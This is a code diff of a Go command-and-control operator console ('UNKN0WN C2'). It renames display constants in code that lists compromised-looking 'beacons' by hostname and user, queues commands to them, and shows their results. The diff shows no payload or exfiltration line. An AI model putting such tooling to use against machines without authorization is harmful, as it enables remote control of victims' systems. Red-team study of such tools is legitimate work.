@@ -13,30 +13,7 @@ import (
 	"time"
 )
 
-const (
-	// Console display formatting
-	beaconListSeparatorLength = 95
-	taskListSeparatorLength   = 85
-	resultSeparatorLength     = 50
-
-	// Column widths for beacon list
-	beaconHostnameWidth = 20
-	beaconUsernameWidth = 15
-	taskCommandWidth    = 40
-
-	// Time format constants
-	timeFormatShort = "15:04:05"
-	timeFormatLong  = "2006-01-02 15:04:05"
-
-	// ANSI escape sequences
-	ansiClearScreen = "\033[2J\033[H"
-
-	// ANSI color codes
-	colorReset  = "\033[0m"
-	colorRed    = "\033[0;31m"
-	colorGreen  = "\033[0;32m"
-	colorYellow = "\033[0;33m"
-)
+// Constants are now defined in constants.go
 
 // Console state management
 var (
@@ -67,15 +44,15 @@ func (cl *ConsoleLogger) Printf(format string, v ...interface{}) {
 	msg := fmt.Sprintf(format, v...)
 
 	// Color [C2] tags green
-	msg = strings.Replace(msg, "[C2]", colorGreen+"[C2]"+colorReset, -1)
+	msg = strings.Replace(msg, "[C2]", ColorGreen+"[C2]"+ColorReset, -1)
 
 	// Color ERROR messages red
 	if strings.Contains(msg, "Error") || strings.Contains(msg, "ERROR") {
-		msg = colorRed + msg + colorReset
+		msg = ColorRed + msg + ColorReset
 	}
 
 	cl.Logger.Print(msg)
-	fmt.Printf("%sc2>%s ", colorGreen, colorReset)
+	fmt.Printf("%sc2>%s ", ColorGreen, ColorReset)
 }
 
 // Global console logger instance
@@ -109,7 +86,7 @@ func startC2Console() {
 	// Initialize console logging
 	initConsoleLogger()
 
-	fmt.Printf("\n%s=== UNKN0WN C2 Management Console ===%s\n", colorGreen, colorReset)
+	fmt.Printf("\n%s=== UNKN0WN C2 Management Console ===%s\n", ColorGreen, ColorReset)
 	fmt.Println("Type 'help' for available commands")
 
 	consoleActive = true
@@ -118,7 +95,7 @@ func startC2Console() {
 	scanner := bufio.NewScanner(os.Stdin)
 
 	for {
-		fmt.Printf("%sc2>%s ", colorGreen, colorReset)
+		fmt.Printf("%sc2>%s ", ColorGreen, ColorReset)
 
 		if !scanner.Scan() {
 			break
@@ -155,9 +132,9 @@ func startC2Console() {
 			command := strings.Join(parts[2:], " ")
 			taskID := c2Manager.AddTask(beaconID, command)
 			if taskID != "" {
-				fmt.Printf("%sTask %s queued for beacon %s%s\n", colorYellow, taskID, beaconID, colorReset)
+				fmt.Printf("%sTask %s queued for beacon %s%s\n", ColorYellow, taskID, beaconID, ColorReset)
 			} else {
-				fmt.Printf("%sFailed to queue task (beacon %s not found)%s\n", colorRed, beaconID, colorReset)
+				fmt.Printf("%sFailed to queue task (beacon %s not found)%s\n", ColorRed, beaconID, ColorReset)
 			}
 
 		case "result", "res":
@@ -170,7 +147,7 @@ func startC2Console() {
 
 		case "clear":
 			// Clear screen (simple version)
-			fmt.Print(ansiClearScreen)
+			fmt.Print(ANSIClearScreen)
 			// Reset log counter since screen is cleared
 			consoleMutex.Lock()
 			logCounter = 0
@@ -233,17 +210,17 @@ func listBeacons() {
 	fmt.Printf("\nRegistered Beacons (%d):\n", len(beacons))
 	fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8s %s\n",
 		"ID", "Hostname", "User", "OS", "Arch", "Queue", "Last Seen")
-	fmt.Println(strings.Repeat("-", beaconListSeparatorLength))
+	fmt.Println(strings.Repeat("-", BeaconListSeparatorLength))
 
 	for _, beacon := range beacons {
 		fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8d %s\n",
 			beacon.ID,
-			truncateString(beacon.Hostname, beaconHostnameWidth),
-			truncateString(beacon.Username, beaconUsernameWidth),
+			truncateString(beacon.Hostname, BeaconHostnameWidth),
+			truncateString(beacon.Username, BeaconUsernameWidth),
 			beacon.OS,
 			beacon.Arch,
 			len(beacon.TaskQueue),
-			beacon.LastSeen.Format(timeFormatShort))
+			beacon.LastSeen.Format(TimeFormatShort))
 	}
 	fmt.Println()
 }
@@ -261,7 +238,7 @@ func listTasks() {
 	fmt.Printf("\nTasks (%d):\n", len(tasks))
 	fmt.Printf("%-8s %-10s %-10s %-40s %s\n",
 		"Task ID", "Beacon", "Status", "Command", "Created")
-	fmt.Println(strings.Repeat("-", taskListSeparatorLength))
+	fmt.Println(strings.Repeat("-", TaskListSeparatorLength))
 
 	// Get expected results for progress tracking
 	expectedResults := c2Manager.GetExpectedResults()
@@ -287,8 +264,8 @@ func listTasks() {
 			task.ID,
 			task.BeaconID,
 			statusDisplay,
-			truncateString(task.Command, taskCommandWidth),
-			task.CreatedAt.Format(timeFormatShort))
+			truncateString(task.Command, TaskCommandWidth),
+			task.CreatedAt.Format(TimeFormatShort))
 	}
 	fmt.Println()
 }
@@ -300,7 +277,7 @@ func showTaskResult(taskID string) {
 	task, exists := tasks[taskID]
 
 	if !exists {
-		fmt.Printf("%sTask %s not found%s\n", colorRed, taskID, colorReset)
+		fmt.Printf("%sTask %s not found%s\n", ColorRed, taskID, ColorReset)
 		return
 	}
 
@@ -308,17 +285,17 @@ func showTaskResult(taskID string) {
 	fmt.Printf("  Beacon ID: %s\n", task.BeaconID)
 	fmt.Printf("  Command:   %s\n", task.Command)
 	fmt.Printf("  Status:    %s\n", task.Status)
-	fmt.Printf("  Created:   %s\n", task.CreatedAt.Format(timeFormatLong))
+	fmt.Printf("  Created:   %s\n", task.CreatedAt.Format(TimeFormatLong))
 
 	if task.SentAt != nil {
-		fmt.Printf("  Sent:      %s\n", task.SentAt.Format(timeFormatLong))
+		fmt.Printf("  Sent:      %s\n", task.SentAt.Format(TimeFormatLong))
 	}
 
 	if task.Result != "" {
 		fmt.Printf("  Result (%d chars):\n", len(task.Result))
-		fmt.Println(strings.Repeat("-", resultSeparatorLength))
+		fmt.Println(strings.Repeat("-", ResultSeparatorLength))
 		fmt.Println(task.Result)
-		fmt.Println(strings.Repeat("-", resultSeparatorLength))
+		fmt.Println(strings.Repeat("-", ResultSeparatorLength))
 	} else {
 		// Check if we're still receiving chunks
 		expectedResults := c2Manager.GetExpectedResults()
